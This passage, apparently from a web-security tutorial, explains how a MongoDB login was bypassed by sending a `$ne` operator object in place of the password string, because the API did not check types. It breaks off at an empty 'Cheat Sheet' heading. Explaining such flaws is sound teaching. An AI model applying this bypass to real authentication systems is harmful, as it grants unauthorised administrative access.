To ensure seamless integration between frontend JSON payloads and backend data storage, architects adopted Document-Oriented NoSQL databases (e.g., MongoDB). This architecture abstracted the database query language entirely, replacing static query strings with dynamic, hierarchical object evaluation. The systemic security failure emerged from an omission of strict type-enforcement at the API transport boundary. Developers erroneously assumed that a field labeled "password" would inherently be processed as a primitive string. They failed to account for the JSON specification's ability to transmit rich objects. The attacker weaponized this type fluidity by substituting a literal string parameter with a nested logical directive (`$ne`). Because the backend blindly funneled the dynamically parsed object directly into the database engine, the database evaluated the payload structurally rather than literally. This architectural bypass forced the underlying authentication query to evaluate to a mathematical certainty, entirely nullifying the password verification matrix and granting the attacker frictionless, unauthenticated administrative access
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
